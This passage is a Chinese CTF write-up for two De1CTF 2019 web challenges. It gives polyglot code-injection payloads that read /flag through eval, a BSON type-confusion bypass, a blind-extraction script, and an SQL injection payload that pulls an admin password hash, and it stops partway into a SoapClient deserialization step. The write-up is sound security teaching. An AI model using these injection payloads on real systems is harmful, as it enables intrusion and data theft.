+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">const serializedBson = bson.serialize(calculateModel);</span><br><span class="line">const urls = [&apos;10.0.20.11&apos;, &apos;10.0.20.12&apos;, &apos;10.0.20.13&apos;];</span><br><span class="line">bluebird.map(urls, async (url) =&gt; &#123;</span><br><span class="line">	return Axios.post(`http://$&#123;url&#125;/`, serializedBson, &#123;</span><br><span class="line">		headers: &#123;</span><br><span class="line">			&apos;Content-Type&apos;: &apos;text/plain&apos;,</span><br><span class="line">		&#125;,</span><br><span class="line">		responseType: &apos;arraybuffer&apos;,</span><br><span class="line">		timeout: 50</span><br><span class="line">	&#125;).catch(e =&gt; &#123;</span><br><span class="line">		return &#123; data: e.message, headers: [] &#125;;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;).all().then((responses) =&gt; &#123;</span><br><span class="line">	const jsonResponses = responses.map(p =&gt; &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			return bson.deserialize(p.data);</span><br><span class="line">		&#125; catch (e) &#123;</span><br><span class="line">			return p.data.toString(&apos;utf-8&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	const set = new Set(jsonResponses.map(p =&gt; JSON.stringify(p)));</span><br><span class="line">	this.logger.log(`Expression = $&#123;JSON.stringify(calculateModel.expression)&#125;`);</span><br><span class="line">	this.logger.log(&apos;Ret = &apos; + JSON.stringify(jsonResponses));</span><br><span class="line">	if (set.size === 1) &#123;</span><br><span class="line">		const rand = Math.floor(Math.random() * responses.length);</span><br><span class="line">		Object.keys(responses[rand].headers).forEach((key) =&gt; &#123;</span><br><span class="line">			if (!blackList.includes(key.toLowerCase())) &#123;</span><br><span class="line">				res.setHeader(key, responses[rand].headers[key]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		res.json(jsonResponses[rand]);</span><br><span class="line">		res.end();</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		res.end(&apos;That\&apos;s classified information. - Asahina Mikuru&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">	res.status(500).json(&#123; ret: &apos;Internal error&apos; &#125;).end();</span><br><span class="line">	this.logger.error(e.message, e.trace);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>接下部分的代码，将calculateModel进行bson序列化，然后分别发向三个部署在内网的程序，继而获得响应再将其反序列化赋给p<br>接着再将p进行json序列化后并去重（这里其实不太懂到底是所有结果都在p中然后被序列化，还是三个结果各自被序列化后放在一个数组。不过去重是对数组感觉像是后者，但代码上看起来又不是，一个p被赋三个值感觉不太对。先留个坑日后用nestjs试试看Orz）。去重结果也就是<code>set.size</code>为1时返回数据，否则报错</p>
+<p>之前在calcalcalc用isVips绕长度限制时没说清楚，能够用json传值然后赋给isVip是因为express的默认解析是支持json的，这点去查看文档就能看到</p>
+<p>2.x版本的</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8becacd04f668c3b27a5ac12513a8bbe.png" alt=""></p>
+<p>4.x版本的</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/25123b379be4290612bb75a83a429132.png" alt=""></p>
+<p>读源码可看出</p>
+<p>因此接收到的json格式的数据能够传入calculateModel，把isVip的值给覆盖成功绕过长度限制</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/96bb94856ffbef2d54dc109774cde74a.png" alt=""></p>
+<p>长度绕过后就是这个令人头大的正则，由于少了<code>()</code>不能通过双eval去盲注，只能想办法绕过这个正则<br>这里要利用js将json类型处理为字符串时，会处理为<code>[Object Object]</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7df053430a07f62653da37805352b3ce.png" alt=""></p>
+<p>只要我们传入的expression为json类型，toString()后就会变为<code>[Object Object]</code>，从而绕过正则检验。当然这里对原数据是没影响的，本来就没有在原数据上进行操作</p>
+<p>但有个问题在于，在nodejs端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.post(&apos;/&apos;, (req, res) =&gt; &#123;</span><br><span class="line">	const body = req.body</span><br><span class="line">	const data = bson.deserialize(Buffer.from(body))</span><br><span class="line">	const ret = eval(data.expression.toString())</span><br><span class="line">	res.write(bson.serialize(&#123; ret: ret.toString() &#125;))</span><br><span class="line">	res.end()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>可以看到对传入的数据进行了toString()，导致数据不能使用。而这题将flag放在的三处，无法忽略掉这个问题</p>
+<p>绕过这里需要利用mongoDB对bson反序列化时的一个特性<br><a href="https://github.com/mongodb/js-bson/blob/master/lib/parser/serializer.js#L756" target="_blank" rel="noopener">js-bson/lib/parser/serializer.js </a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">else if (value[&apos;_bsontype&apos;] === &apos;Binary&apos;) &#123;</span><br><span class="line">	index = serializeBinary(buffer, key, value, index, true);</span><br><span class="line">&#125; else if (value[&apos;_bsontype&apos;] === &apos;Symbol&apos;) &#123;</span><br><span class="line">	index = serializeSymbol(buffer, key, value, index, true);</span><br><span class="line">&#125; else if (value[&apos;_bsontype&apos;] === &apos;DBRef&apos;) &#123;</span><br><span class="line">	index = serializeDBRef(buffer, key, value, index, depth, serializeFunctions, true);</span><br><span class="line">&#125; else if (value[&apos;_bsontype&apos;] === &apos;BSONRegExp&apos;) &#123;</span><br><span class="line">	index = serializeBSONRegExp(buffer, key, value, index, true);</span><br><span class="line">&#125; else if (value[&apos;_bsontype&apos;] === &apos;Int32&apos;) &#123;</span><br><span class="line">	index = serializeInt32(buffer, key, value, index, true);</span><br><span class="line">&#125; else if (value[&apos;_bsontype&apos;] === &apos;MinKey&apos; || value[&apos;_bsontype&apos;] === &apos;MaxKey&apos;) &#123;</span><br><span class="line">	index = serializeMinMax(buffer, key, value, index, true);</span><br><span class="line">&#125; else if (typeof value[&apos;_bsontype&apos;] !== &apos;undefined&apos;) &#123;</span><br><span class="line">	throw new TypeError(&apos;Unrecognized or invalid _bsontype: &apos; + value[&apos;_bsontype&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>读源码可以看出在bson数据在进行反序列化时，会根据对象中_bsontype的值，将对象的value转化为对应的类型</p>
+<p>特就是，假如一个bson序列化字符串为<br>{‘a’:{‘value’:’xxx’,’_bsontype’:’Binary’}}<br>那么在反序列化后，a就会被强制转为二进制类型，值依旧为xxx</p>
+<p>利用这点进行测试，会发现当类型为Symbol时能够绕过，于是利用构造payload</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/487c3902ca6c5fda7ea6ef2b928623dd.png" alt=""></p>
+<p>payload很巧妙的利用了php，python和nodejs在单行和多行注释上的不同，大佬们实在tql</p>
+<p>打python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1//1 and ord(open(&apos;/flag&apos;).read()[0]) &gt; -1 and 1\n</span><br></pre></td></tr></table></figure>
+<p>php和nodejs由于注释恒为1，python由于//为除号继续运行，根据读出的值条件是否正确返回1或false。为1时显示正常，false则报错，以此盲注</p>
+<p>打php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(&apos;1&apos;) + 0//5 or &apos;&apos;&apos;\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP([&apos;ret&apos; =&gt; file_get_contents(&apos;/flag&apos;)[0] == &apos;0&apos; ? &quot;1&quot; : &quot;2&quot;]);exit;&#125;?&gt;*///&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>在python中，由于’’’为多行注释，于是无视\n的分行，直接注释到结尾，只剩下<code>len(&#39;1&#39;) + 0//5 or</code>部分，结果恒为1（不知道为啥不跟后面的注释就会报错，但跟上的后面的注释就能成功的输出1，这也在大佬们的计算中吗！</p>
+<p>在nodejs中，//为单行注释，于是\n后的部分便不再注释范围内。而/**/为多行注释于是执行的代码就只剩下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len(&apos;1&apos;) + 0</span><br><span class="line">1;function len()&#123;return 1&#125;</span><br></pre></td></tr></table></figure>
+<p>执行结果恒为1</p>
+<p>在php中，同样//为单行注释，这里还利用了&lt;?php?&gt;直接将外部的代码无视掉，于是执行的代码就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return len(&apos;1&apos;) + 0?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function len($a)&#123;echo MongoDB\\BSON\\fromPHP([&apos;ret&apos; =&gt; file_get_contents(&apos;/flag&apos;)[0] == &apos;0&apos; ? &quot;1&quot; : &quot;2&quot;]);exit;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+<p>由于是结尾，于是可以不使用;。然后定义了len函数读取比较，当值相等时返回1，否则返回2，于是与python盲注同理<br>这里其实觉得不用bson序列化也行，毕竟后面还有一个序列化再输出的</p>
+<p>打nodejs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 + 0//5 or &apos;&apos;&apos;\n//?&gt;\nrequire(&apos;fs&apos;).readFileSync(&apos;/flag&apos;,&apos;utf-8&apos;)[0] == &apos;0&apos; ? 1 : 2;//&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>这条不是官方的payload，不过我觉得没必要再给php专门写个open()，有点多余<br>在python下<code>1 + 0//5 or</code>直接输出1，在php下<code>1 + 0也</code>是输出1</p>
+<p>在nodejs下，这剩下的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 + 0</span><br><span class="line">require(&apos;fs&apos;).readFileSync(&apos;/flag&apos;,&apos;utf-8&apos;)[0] == &apos;0&apos; ? 1 : 2;</span><br></pre></td></tr></table></figure>
+<p>总觉得这个会返回前面的恒为1，而不是后面那个，感觉不太靠谱的亚子</p>
+<p>然后把payload放入传输的数据中,写脚本盲注即可<br><code>{&#39;expression&#39;:{&#39;value&#39;:&#39;payload&#39;,&#39;_bsontype&#39;:&#39;Symbol&#39;},&#39;isVip&#39;:true}</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-、</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://33b3ae01-10a6-419c-a822-956b08f91f04.node3.buuoj.cn/calculate&quot;</span><br><span class="line">ua_header = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;,&#125;</span><br><span class="line">sign = &quot;&apos;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_&quot;</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(48):</span><br><span class="line">	for j in sign:</span><br><span class="line">		# python</span><br><span class="line">		# data = &quot;1//1 and ord(open(&apos;/flag&apos;).read()[&quot;+str(i)+&quot;]) == &quot;+str(ord(j))+&quot; and 1\\n&quot;</span><br><span class="line">		# php</span><br><span class="line">		# data = &quot;len(&apos;1&apos;) + 0//5 or &apos;&apos;&apos;\\n//?&gt;\\n1;function len()&#123;return 1&#125;/*&lt;?php\\nfunction len($a)&#123;echo MongoDB\\\\BSON\\\\fromPHP([&apos;ret&apos; =&gt; file_get_contents(&apos;/flag&apos;)[&quot;+str(i)+&quot;] == &apos;&quot;+j+&quot;&apos; ? \\\&quot;1\\\&quot; : \\\&quot;2\\\&quot;]);exit;&#125;?&gt;*///&apos;&apos;&apos;&quot;</span><br><span class="line">		# nodejs</span><br><span class="line">		# data = &quot;1 + 0//5 or &apos;&apos;&apos;\\n//?&gt;\\nrequire(&apos;fs&apos;).readFileSync(&apos;/flag&apos;,&apos;utf-8&apos;)[&quot;+str(i)+&quot;] == &apos;&quot;+j+&quot;&apos; ? 1 : 2;//&apos;&apos;&apos;&quot;</span><br><span class="line"></span><br><span class="line">		payload = &quot;&#123;\&quot;expression\&quot;:&#123;\&quot;value\&quot;:\&quot;&quot;+data+&quot;\&quot;,\&quot;_bsontype\&quot;:\&quot;Symbol\&quot;&#125;,\&quot;isVip\&quot;:true&#125;&quot;</span><br><span class="line">		print payload</span><br><span class="line">		request = requests.post(url, headers = ua_header, data=payload)</span><br><span class="line">		content = request.content</span><br><span class="line">		if &apos;ret&apos; in content:</span><br><span class="line">			flag += j</span><br><span class="line">			break</span><br><span class="line">	print flag</span><br></pre></td></tr></table></figure>
+<h2 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h2><p>进入是个葛优瘫的登录界面，有个md5截断，用脚本跑一下就ok</p>
+<p>登陆进去后能发送消息，不过好像只能自己看到不太像xss。然后尝试<code>php://filter</code>被过滤了，接着尝试各种源码泄露，发现了swp的泄露</p>
+<p>于是拿下源码，恢复一下<code>.index.php.swp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &apos;user.php&apos;;</span><br><span class="line">$C = new Customer();</span><br><span class="line">if(isset($_GET[&apos;action&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $action=$_GET[&apos;action&apos;];</span><br><span class="line">    $allow=0;</span><br><span class="line">    $white_action = &quot;delete|index|login|logout|phpinfo|profile|publish|register&quot;;</span><br><span class="line">    $vpattern = explode(&quot;|&quot;,$white_action);</span><br><span class="line">    foreach($vpattern as $key=&gt;$value)</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/$value/i&quot;, $action ) &amp;&amp;  (!preg_match(&quot;/\//i&quot;,$action))   )</span><br><span class="line">        &#123;</span><br><span class="line">            $allow=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($allow==1)</span><br><span class="line">    &#123;require_once &apos;views/&apos;.$_GET[&apos;action&apos;];&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die(&quot;Get out hacker!&lt;br&gt;jaivy&apos;s laji waf.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">header(&apos;Location: index.php?action=login&apos;);</span><br></pre></td></tr></table></figure>
+<p>可以看到实例化了一个Customer类，并且只允许几个白名单的字符串，同时引入了ues.php<br>于是拿一下user.php的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require_once &apos;config.php&apos;;</span><br><span class="line"></span><br><span class="line">class Customer&#123;</span><br></pre></td></tr></table></figure>
+<p>可以看到有一个Customer类，同时又引入了一个config.php，继续拿<br>再config.php中可以看到，用了全局过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function addslashes_deep($value)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($value))</span><br><span class="line">    &#123;</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        return is_array($value) ? array_map(&apos;addslashes_deep&apos;, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function addsla_all()</span><br><span class="line">&#123;</span><br><span class="line">    if (!get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        if (!empty($_GET))</span><br><span class="line">        &#123;</span><br><span class="line">            $_GET  = addslashes_deep($_GET);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!empty($_POST))</span><br><span class="line">        &#123;</span><br><span class="line">            $_POST = addslashes_deep($_POST);</span><br><span class="line">        &#125;</span><br><span class="line">        $_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">        $_REQUEST  = addslashes_deep($_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">addsla_all();</span><br></pre></td></tr></table></figure>
+<p>这就有点不好搞了</p>
+<p>拿到这几个源码后，再去试试看能不能取到发布消息和显示消息页面，网站的主要功能是这两个，漏洞可能也在这里<br>尝试了几次后发现<code>/view/publish.swp</code>和<code>/view/index.swp</code>能够拿到源码</p>
+<p>先看publish部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($C-&gt;is_admin==0) &#123;</span><br><span class="line">    if (isset($_POST[&apos;signature&apos;]) &amp;&amp; isset($_POST[&apos;mood&apos;])) &#123;</span><br><span class="line">        $res = @$C-&gt;publish();</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;ok&apos;);self.location=&apos;index.php?action=index&apos;; &lt;/script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;something error&apos;);self.location=&apos;index.php?action=publish&apos;; &lt;/script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">else&#123;</span><br><span class="line">echo &quot;Hello &quot;.$C-&gt;username.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Orz...大佬果然进来了!&lt;br&gt;但jaivy说flag不在这,要flag,来内网拿...&lt;br&gt;&quot;;</span><br><span class="line">    if(isset($_FILES[&apos;pic&apos;]))&#123;</span><br><span class="line">        $res = @$C-&gt;publish();</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;ok&apos;);self.location=&apos;index.php?action=publish&apos;; &lt;/script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;something error&apos;);self.location=&apos;index.php?action=publish&apos;; &lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当是非admin，差别是有否文件上传的功能，那应该就是要想办法去登录admin账号</p>
+<p>先继续看publish()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function publish()</span><br><span class="line">   &#123;</span><br><span class="line">       if(!$this-&gt;check_login()) return false;</span><br><span class="line">       if($this-&gt;is_admin == 0)</span><br><span class="line">       &#123;</span><br><span class="line">           if(isset($_POST[&apos;signature&apos;]) &amp;&amp; isset($_POST[&apos;mood&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">               $mood = addslashes(serialize(new Mood((int)$_POST[&apos;mood&apos;],get_ip())));</span><br><span class="line">               $db = new Db();</span><br><span class="line">               @$ret = $db-&gt;insert(array(&apos;userid&apos;,&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;),&apos;ctf_user_signature&apos;,array($this-&gt;userid,$this-&gt;username,$_POST[&apos;signature&apos;],$mood));</span><br><span class="line">               if($ret)</span><br><span class="line">                   return true;</span><br><span class="line">               else</span><br><span class="line">                   return false;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       else</span><br><span class="line">       &#123;</span><br><span class="line">               if(isset($_FILES[&apos;pic&apos;])) </span><br><span class="line">               &#123;</span><br><span class="line">                   $dir=&apos;/app/upload/&apos;;</span><br><span class="line">                   move_uploaded_file($_FILES[&apos;pic&apos;][&apos;tmp_name&apos;],$dir.$_FILES[&apos;pic&apos;][&apos;name&apos;]);</span><br><span class="line">                   echo &quot;&lt;script&gt;alert(&apos;&quot;.$_FILES[&apos;pic&apos;][&apos;name&apos;].&quot;upload success&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">                   return true;</span><br><span class="line">               &#125;</span><br><span class="line">               else</span><br><span class="line">                   return false;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>调用了insert(),继续读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private function get_column($columns)&#123;</span><br><span class="line"></span><br><span class="line">       if(is_array($columns))</span><br><span class="line">           $column = &apos; `&apos;.implode(&apos;`,`&apos;,$columns).&apos;` &apos;;</span><br><span class="line">       else</span><br><span class="line">           $column = &apos; `&apos;.$columns.&apos;` &apos;;</span><br><span class="line"></span><br><span class="line">       return $column;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function insert($columns,$table,$values)&#123;</span><br><span class="line"></span><br><span class="line">       $column = $this-&gt;get_column($columns);</span><br><span class="line">       $value = &apos;(&apos;.preg_replace(&apos;/`([^`,]+)`/&apos;,&apos;\&apos;$&#123;1&#125;\&apos;&apos;,$this-&gt;get_column($values)).&apos;)&apos;;</span><br><span class="line">       $nid =</span><br><span class="line">       $sql = &apos;insert into &apos;.$table.&apos;(&apos;.$column.&apos;) values &apos;.$value;</span><br><span class="line">       $result = $this-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">       return $result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到用了get_column()对值进行了处理，在各值两侧加上反引号。然后由于是用来处理列的，于是处理值是要对值将`转为’。<br><code>/`([^`,]+)`/</code>这个表达式匹配的是，两个反引号间不存在`和,的字符串。<code>\&#39;${1}\&#39;</code>则是将两端的`替换为’</p>
+<p>这顿操作就提供了注入的可能，由于反引号是不会被addslashes()转义，就可以用thx经处理后转为’，然后注释掉后面的数据即可。比如像<code>a`)#</code>，经get_column后为<code>`a`)#`</code>，再进过正则就转为了<code>&#39;a&#39;)#`</code>,成功逃逸出来。不过想想有了这个就算没看到前面那个全局过滤好像也没啥影响</p>
+<p>看官方wp是用盲注注出来的，不过既然有回显就没必要盲注那么麻烦，而且连sql语句的结构都知道了，可以构造一下直接回显注入出来</p>
+<p>payload（两端要有空格）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`+(select conv(substr(hex((select password from ctf_users where username = `admin`)),1,10),16,10))+`  </span><br><span class="line">c991707fdf339958eded91331fb11ba0</span><br><span class="line">Jaivypassword</span><br></pre></td></tr></table></figure>
+<p>脚本手工都行，不过每段要分开十进制转16进制，然后再合并起来16进制转字符串。md5解密一下即可<br>不过比赛时可能是出了bug，直接刷着刷着就刷出了密码</p>
+<p>然后登录一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7c33bdbfc1922bfe4317e5c739a345f0.png" alt=""></p>
+<p>提示需要常用的ip，八成是要本地地址才行，尝试改了一下X-Forward-For不行，那估计就是要soap类了</p>
+<p>看源码index.php允许action中传入phpinfo，于是看一下phpinfo，发现确实有soap类可以使用</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a531f81358c641ecbc3ed234a746310e.png" alt=""></p>
+<p>那接下来就是要找一个反序列化的点</p>
+<p>在publish()中可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mood = addslashes(serialize(new Mood((int)$_POST[&apos;mood&apos;],get_ip())));</span><br><span class="line">$db = new Db();</span><br><span class="line">@$ret = $db-&gt;insert(array(&apos;userid&apos;,&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;),&apos;ctf_user_signature&apos;,array($this-&gt;userid,$this-&gt;username,$_POST[&apos;signature&apos;],$mood));</span><br></pre></td></tr></table></figure>
+<p>mood类被序列化后存入了数据库，那在取出时应该需要进行反序列化。于是去index页面看看<br><code>$data = $C-&gt;showmess();</code><br>调用了showmess()<br><code>$mood = unserialize($row[2]);</code><br>在showmess()中也确实找到了将取出的数据进行了反序列化，那么要利用的点就在这里</p>
+<p>看代码可以知道，无论怎么控制mood的值，都是无法产生soap类。那就只能继续利用signature，将后面的mood给覆盖掉<br>于是要构造一个soap对象，cookie中有PHPSESSID，数据包含用户名、密码和验证码。通过一个用户发送读取消息，让另一个PHPSESSID的用户登录admin账户</p>
+<p>之前比赛的时候只是用了下，没用认真研究soap类的请求是什么样的，这里就分析一下</p>
